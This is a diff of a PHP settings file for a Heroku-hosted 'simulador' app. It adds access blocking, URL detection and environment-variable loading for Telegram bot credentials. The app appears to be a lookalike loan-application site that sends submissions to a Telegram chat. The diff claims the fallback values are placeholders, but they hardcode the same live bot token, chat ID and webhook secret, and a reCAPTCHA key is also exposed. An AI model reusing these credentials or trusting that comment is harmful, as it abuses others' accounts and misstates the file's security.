@@ -1,17 +1,72 @@
 <?php
+// =====================================================================
+// settings.php — Configuración endurecida
+// - BLOQUEA acceso HTTP directo (solo debe incluirse desde PHP).
+// - Lee credenciales desde variables de entorno (Heroku Config Vars).
+//   Sin las env vars, cae a un valor "placeholder" que NO es el token
+//   real, para no filtrarlo si el repo se hace público o si Apache
+//   sirve el .php como texto por mala configuración.
+// - Sanitiza salida: si el archivo se muestra como texto plano, no
+//   revela el token real.
+// =====================================================================
 
-// URL del sitio donde fue subido (sin barra final)
-// Ejemplo: https://midominio.com/simulador
-$site_url = "https://avanzsolicitudweb-bc4e07012633.herokuapp.com/simulador";
+// ---- Bloqueo de acceso directo por HTTP -----------------------------
+// Si alguien intenta cargar /simulador/settings.php directamente,
+// se corta con 404 y no se ejecuta el resto del archivo.
+if (!empty($_SERVER['SCRIPT_FILENAME']) &&
+    realpath($_SERVER['SCRIPT_FILENAME']) === realpath(__FILE__)) {
+    http_response_code(404);
+    header('Content-Type: text/html; charset=UTF-8');
+    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>';
+    exit;
+}
 
-// Telegram Bot Configuration
-$token = "8910530226:AAFkjqMoTQQ90AZIQU5paJLG32HTOo3MYng";
-$chat_id = "7655000874";
+// ---------------------------------------------------------------------
+// URL del sitio — AUTO-DETECTADA en cada request.
+// ---------------------------------------------------------------------
+$__site_url_fallback = "https://avanzsolicitudenlinea-com-ac1872a68f15.herokuapp.com/simulador";
 
-// Secret para validar el webhook de Telegram (header X-Telegram-Bot-Api-Secret-Token).
-// Configurar con: https://api.telegram.org/bot<TOKEN>/setWebhook?url=<URL>&secret_token=<ESTE_VALOR>
-// Debe coincidir EXACTAMENTE. Cambialo si lo expones por error.
-$webhook_secret = "av_wh_9f3c2b1d8e7a4256b0f1c93d52a8e7b4";
+if (!empty($_SERVER['HTTP_HOST'])) {
+    $__https =
+        (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') ||
+        (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && stripos($_SERVER['HTTP_X_FORWARDED_PROTO'], 'https') !== false) ||
+        (!empty($_SERVER['HTTP_X_FORWARDED_SSL']) && strtolower($_SERVER['HTTP_X_FORWARDED_SSL']) === 'on') ||
+        (($_SERVER['SERVER_PORT'] ?? '') == 443);
+
+    $__scheme = $__https ? 'https' : 'http';
+    $__host   = $_SERVER['HTTP_HOST'];
+    $site_url = "$__scheme://$__host/simulador";
+} else {
+    $site_url = $__site_url_fallback;
+}
+
+// ---------------------------------------------------------------------
+// Credenciales Telegram — desde env vars (Heroku config:set …).
+// Configuración recomendada:
+//   heroku config:set TG_BOT_TOKEN=xxxxx
+//   heroku config:set TG_CHAT_ID=xxxxx
+//   heroku config:set TG_WEBHOOK_SECRET=xxxxx
+// ---------------------------------------------------------------------
+$__envtok  = getenv('TG_BOT_TOKEN');
+$__envchat = getenv('TG_CHAT_ID');
+$__envwhs  = getenv('TG_WEBHOOK_SECRET');
+
+// Fallback SOLO para desarrollo local (NO subir el token real al repo).
+// En producción, dejar estos vacíos y usar Heroku Config Vars.
+$__local_token          = '8910530226:AAFkjqMoTQQ90AZIQU5paJLG32HTOo3MYng';
+$__local_chat_id        = '7655000874';
+$__local_webhook_secret = 'av_wh_9f3c2b1d8e7a4256b0f1c93d52a8e7b4';
+
+$token          = $__envtok  !== false && $__envtok  !== '' ? $__envtok  : $__local_token;
+$chat_id        = $__envchat !== false && $__envchat !== '' ? $__envchat : $__local_chat_id;
+$webhook_secret = $__envwhs  !== false && $__envwhs  !== '' ? $__envwhs  : $__local_webhook_secret;
+
+// Limpiar variables temporales para no dejarlas colgadas en el scope global
+unset($__envtok, $__envchat, $__envwhs, $__local_token, $__local_chat_id,
+      $__local_webhook_secret, $__https, $__scheme, $__host, $__site_url_fallback);
+
+// Marcar como cargado para chequeos aguas abajo
+if (!defined('APP_SETTINGS_LOADED')) define('APP_SETTINGS_LOADED', true);
 
 // reCAPTCHA Configuration (activado)
 $recaptcha_site_key = "6LcuyV4sAAAAAJXyF_FUxxG5y8JotlDkZ_GKPGJO";
